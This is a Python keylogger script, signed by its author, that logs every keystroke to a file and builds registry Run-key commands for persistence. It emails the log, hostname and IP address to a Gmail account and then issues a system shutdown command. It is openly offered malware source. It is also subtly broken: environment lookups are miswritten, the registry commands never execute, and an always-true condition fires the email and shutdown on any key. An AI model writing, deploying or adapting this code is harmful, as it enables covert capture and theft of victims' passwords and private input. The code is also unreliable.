from pynput.keyboard import Key, Listener
import logging
import socket
import smtplib
import subprocess
import os
import shutil
import sys

#Made By Fazz

hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def regeditEkle():
    yeniDosya = os.environ("appdata") + "\\keylogger.exe"
    yeniDosya2 = os.environ("appdata") + "\\keylog.txt"
    if not os.path.exists(yeniDosya):
        shutil.copyfile(sys.executable,yeniDosya, yeniDosya2)
        regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v REG_SZ /d " +yeniDosya
        regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v REG_SZ /d " +yeniDosya2

regeditEkle()

def on_press(key):
    logging.info(str(key))

    if key == Key.enter or Key.space:
        from email.message import EmailMessage
        Sender_Email = "Mail Adresiniz"
        Reciever_Email = "Alıcı Mail Adresiniz"
        Password = "Mail Adres şifreniz"
        newMessage = EmailMessage()                         
        newMessage['Subject'] = hostname 
        newMessage['From'] = Sender_Email  
        newMessage['To'] = Reciever_Email                   
        newMessage.set_content(IP) 
        files = ['keylog.txt']
        for file in files:
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_name = f.name
                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    
            smtp.login(Sender_Email, Password)              
            smtp.send_message(newMessage)
            subprocess.call("shutdown /s")
        
 
with Listener(on_press=on_press) as listener :
    listener.join()

